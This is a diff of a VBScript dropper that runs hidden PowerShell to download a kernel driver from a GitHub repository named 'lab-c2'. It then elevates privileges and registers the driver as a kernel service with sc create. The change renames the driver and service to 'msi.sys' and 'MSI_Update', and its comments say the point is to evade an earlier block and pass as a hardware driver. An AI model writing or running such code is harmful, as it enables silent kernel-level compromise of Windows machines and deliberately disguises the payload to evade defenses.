@@ -1,13 +1,13 @@
 Set objShell = CreateObject("WScript.Shell")
-' Using Public folder to ensure the path is identical for all users
-driverPath = "C:\Users\Public\se64a.sys"
-githubURL = "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/se64a.sys"
+' Moving to a new path to avoid the "History" block from the previous attempt
+driverPath = "C:\Users\Public\msi.sys"
+githubURL = "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/msi.sys"
 
-' 1. Download the driver to the Public folder
-cmdDownload = "powershell -NoP -W Hidden -C ""Invoke-WebRequest -Uri '" & githubURL & "' -OutFile '" & driverPath & "'"""
+' 1. Download the MSI driver
+cmdDownload = "powershell -NoP -W Hidden -C ""iwr '" & githubURL & "' -OutFile '" & driverPath & "'"""
 objShell.Run cmdDownload, 0, True
 
-' 2. Register and Start the service
-' We use 'sc delete' first to clear the old broken service, then 'sc create'
-cmdLoad = "powershell -NoP -W Hidden -C ""Start-Process cmd -ArgumentList '/c sc delete se64a & sc create se64a binPath= " & driverPath & " type= kernel && sc start se64a' -Verb RunAs"""
+' 2. Clear old attempts and Load the MSI driver
+' We use a unique service name 'MSI_Update' to look like a hardware driver
+cmdLoad = "powershell -NoP -W Hidden -C ""Start-Process cmd -ArgumentList '/c sc delete msi_update & sc create msi_update binPath= " & driverPath & " type= kernel && sc start msi_update' -Verb RunAs"""
 objShell.Run cmdLoad, 0, False
